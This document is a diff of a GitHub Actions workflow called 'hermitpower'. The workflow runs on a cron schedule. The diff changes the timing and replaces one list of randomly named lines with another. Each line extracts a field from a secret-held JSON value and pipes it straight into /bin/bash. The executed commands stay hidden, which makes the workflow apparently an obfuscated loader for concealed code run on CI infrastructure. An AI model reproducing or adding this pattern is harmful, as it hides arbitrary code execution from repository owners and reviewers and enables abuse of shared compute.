@@ -2,7 +2,8 @@ name: hermitpower
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '23 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,35 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: hermitpower
         env:
-          ef7917: ${{ secrets.ef7917 }}
+          u35: ${{ secrets.u35 }}
         run: |
-          echo $ef7917 | jq -r .mzqn356 | /bin/bash
-          echo $fdvbj2 | jq -r .plu70235 | /bin/bash
-          echo $vfq858 | jq -r .q1866 | /bin/bash
-          echo $idno148 | jq -r .culn57820 | /bin/bash
-          echo $vts986 | jq -r .dygaf33 | /bin/bash
-          echo $r82 | jq -r .lsm5 | /bin/bash
-          echo $cqfb27623 | jq -r .kxo1 | /bin/bash
-          echo $hfkr38452 | jq -r .tqi8847 | /bin/bash
-          echo $ilbv0068 | jq -r .hn37153 | /bin/bash
-          echo $irap5 | jq -r .gcya70796 | /bin/bash
-          echo $muyc60553 | jq -r .gao6984 | /bin/bash
-          echo $gdedx19 | jq -r .c832 | /bin/bash
-          echo $xzg14 | jq -r .nepjk0908 | /bin/bash
-          echo $tjpko2430 | jq -r .gm907 | /bin/bash
-          echo $cv21 | jq -r .oa11805 | /bin/bash
-          echo $oj600 | jq -r .s415 | /bin/bash
-          echo $qomt3004 | jq -r .c67824 | /bin/bash
-          echo $w7 | jq -r .o9286 | /bin/bash
-          echo $evax30929 | jq -r .yk70 | /bin/bash
-          echo $jwkf7 | jq -r .uqjou07 | /bin/bash
-          echo $yn2288 | jq -r .tzg884 | /bin/bash
-          echo $vf725 | jq -r .tisf3717 | /bin/bash
-          echo $jrz84512 | jq -r .triex42074 | /bin/bash
-          echo $wmgki8694 | jq -r .zfzm5148 | /bin/bash
-          echo $t8 | jq -r .v3033 | /bin/bash
-          echo $apn29 | jq -r .zgrrh19858 | /bin/bash
-          echo $gkiny45 | jq -r .lwrb0 | /bin/bash
-          echo $jicb5393 | jq -r .riqnh79 | /bin/bash
-          echo $rrm657 | jq -r .c7865 | /bin/bash
+          echo $u35 | jq -r .tzy5 | /bin/bash
+          echo $arfdc607 | jq -r .uut72007 | /bin/bash
+          echo $toq1670 | jq -r .vsl61846 | /bin/bash
+          echo $sube47 | jq -r .km38603 | /bin/bash
+          echo $wrfh5003 | jq -r .atddx7787 | /bin/bash
+          echo $qls75 | jq -r .lwu763 | /bin/bash
+          echo $ua67699 | jq -r .shukl732 | /bin/bash
+          echo $muy070 | jq -r .anq2 | /bin/bash
+          echo $eh6 | jq -r .jn82900 | /bin/bash
+          echo $c9 | jq -r .mtga96 | /bin/bash
+          echo $e29 | jq -r .hi9 | /bin/bash
+          echo $dasmp72 | jq -r .va843 | /bin/bash
+          echo $rvh29543 | jq -r .nz9 | /bin/bash
+          echo $t39921 | jq -r .ftrpt978 | /bin/bash
+          echo $bx4776 | jq -r .m0407 | /bin/bash
 
